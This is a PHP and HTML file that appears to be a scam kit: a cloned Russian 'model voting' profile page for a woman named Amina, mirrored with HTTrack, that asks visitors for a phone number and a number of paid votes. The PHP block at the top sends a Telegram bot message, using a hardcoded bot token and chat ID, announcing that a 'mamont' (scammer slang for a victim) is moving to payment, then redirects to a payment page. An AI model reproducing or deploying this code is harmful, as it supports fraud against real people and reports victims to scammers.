<?php 
   if(isset($_POST['btn'])){
    //в переменную $token нужно вставить токен, который нам прислал @botFather
$token = "5321243803:AAHfp2NgdeyyjRTwuJLS0mmiYthPqu-DLLU";
 
//нужна вставить chat_id (Как получить chad id, читайте ниже)
$chat_id = "-435908473";




//Далее создаем переменную, в которую помещаем PHP массив
$arr = array(
  '💸Мамонт перешел на оплату голосов "Амина": ' => $namemodels, //name
);
 
//При помощи цикла перебираем массив и помещаем переменную $txt текст из массива $arr
foreach($arr as $key => $value) {
  $txt .= "<b>".$key."</b> ".$value."%0A";
};
 
//Осуществляется отправка данных в переменной $sendToTelegram
$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");


 
//Если сообщение отправлено, напишет "Thank you", если нет - "Error"
if ($sendToTelegram) {
  header("Location:../payment.php");
} else {
  echo "Error";
    }
}
 ?>
<!DOCTYPE html>
<html lang="ru">


<!-- Mirrored from bestmodelss.ru/profile/18 by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 11 Jul 2021 16:30:51 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>    Голосование
</title>
    <link rel="icon" href="../images/icon.png">
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@700&amp;display=swap" rel="stylesheet">
    <link rel="stylesheet" href="../../maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="../../cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" />
    <script src="http://code.jivosite.com/widget/Gm8J010U0z" async></script>
</head>

<body>
    <header id="header" class="header menu">
        <div class="container">
            <div class="row justify-content-md-center">
                <div class="col main__menu">
                    <a href="../index.php">Главная</a>
                </div>
            </div>
        </div>
    </header>

        <section class="profile">
        <div class="container profile-outline">
            <div class="row">
                <div class="col-lg-8">
                    <div id="carouselExampleIndicators" class="carousel slide" data-ride="carousel">
                        <ol class="carousel-indicators">
                                                        <li data-target="#carouselExampleIndicators" data-slide-to="0" class="active"></li>
                                                        <li data-target="#carouselExampleIndicators" data-slide-to="1" class=""></li>
                                                        <li data-target="#carouselExampleIndicators" data-slide-to="2" class=""></li>
                                                        <li data-target="#carouselExampleIndicators" data-slide-to="3" class=""></li>
                                                    </ol>
                        <div class="carousel-inner">
                                                    <div class="carousel-item active">
                                <!-- d-block w-100 -->
                                <img src="../profile_images/18/5ffd0465d49717.58390689.jpg" class="img-fluid mx-auto d-block" alt="">
                            </div>
                                                    <div class="carousel-item ">
                                <!-- d-block w-100 -->
                                <img src="../profile_images/18/5ffd0465d4be26.94074635.jpg" class="img-fluid mx-auto d-block" alt="">
                            </div>
                                                    <div class="carousel-item ">
                                <!-- d-block w-100 -->
                                <img src="../profile_images/18/5ffd04a685cd67.44170613.jpg" class="img-fluid mx-auto d-block" alt="">
                            </div>
                                                    <div class="carousel-item ">
                                <!-- d-block w-100 -->
                                <img src="../profile_images/18/5ffd0547e3d062.07475820.jpg" class="img-fluid mx-auto d-block" alt="">
                            </div>
                                                </div>
                        <a class="carousel-control-prev" href="#carouselExampleIndicators" role="button" data-slide="prev">
                            <span class="carousel-control-prev-icon" aria-hidden="true"></span>
                            <span class="visually-hidden"></span>
                        </a>
                        <a class="carousel-control-next" href="#carouselExampleIndicators" role="button" data-slide="next">
                            <span class="carousel-control-next-icon" aria-hidden="true"></span>
                            <span class="visually-hidden"></span>
                        </a>
                    </div>
                </div>
                <div class="col-lg-4">
                    <div class="profile-description">
                        <table class="table table-sm table-borderless">
                            <tbody>
                                <tr>
                                    <th>Имя:</th>
                                <td>Амина</td>
                                </tr>
                                <tr>
                                    <th>Возраст:</th>
                                    <td>23</td>
                                </tr>
                                <tr>
                                    <th>Рост:</th>
                                    <td>165</td>
                                </tr>
                            </tbody>
                        </table>

                        <div class="description__text">
                            <p>Хобби: Спорт, вышивание, кулинария, волонтерство

Интересный факт: В детстве была солисткой в местной поп-группе, занималась тхэквондо и закончила художественную школу, умею водить газель и ловить рыбу руками</p>
                        </div>
                        <div class="price">
                            Цена: 0₽
                        </div>
                        
                        <div class="voting">
                            <form method="post"  enctype="multipart/form-data">
                                <input type="hidden" name="_token" value="Adck8rYdtFVaaHJAagAMBFAE0gZ7mSO9BUWjmZK8">                                <input class="hide" type="text" name="name" value="Амина">
                                <input class="hide" type="text" name="id" value="18">
                                    <div style="margin-bottom: 10px;">
                                        <label for="post-phone" class="inp">
                                            <input required name="phone" class="phome-number" type='tel' id="tel" placeholder="&nbsp;" />
                                            <span class="label">Номер телефона</span>
                                            <span class="focus-bg"></span>
                                        </label>
                                    </div>
                                    <div style="margin-bottom: 10px;">
                                        <label for="post-phone" class="inp">
                                            <input required name="votes" class="count-votes" onDrag="return false" onDrop="return false" onPaste="return false" class="vote" type='text' maxlength="4" id="inp" placeholder="&nbsp;" onkeypress='validate(event)' />
                                            <span class="label">Количество голосов</span>
                                            <span class="focus-bg"></span>
                                        </label>
                                    </div>
                                    <button type="submit" name="btn" class="design__btn unselectable btn-voting">Проголосовать <i class="fa fa-heart"></i></button>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <script type="text/javascript">
        function validate(evt) {
            var theEvent = evt || window.event;

            if (theEvent.type === 'paste') {
                key = event.clipboardData.getData('text/plain');
            } else {
                var key = theEvent.keyCode || theEvent.which;
                key = String.fromCharCode(key);
            }

            var regex = /[0-9]|\./;
            if ((!regex.test(key)) || ($('.count-votes').val() == '' && key == '0') || (key == '.') || (window.getSelection() != '' && key == '0')) {
                theEvent.returnValue = false;
                if (theEvent.preventDefault) theEvent.preventDefault();
            }
        }
    </script>

    <footer class="foteer">
        <!-- <div class="container">
            <div>
                <p class="test">© 2020</p>
            </div>
        </div>
        -->
    </footer>
    <script src="../js/app.js"></script>
    <link href="../css/app.css" rel="stylesheet" type="text/css">
</body>


<!-- Mirrored from bestmodelss.ru/profile/18 by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 11 Jul 2021 16:30:52 GMT -->
</html>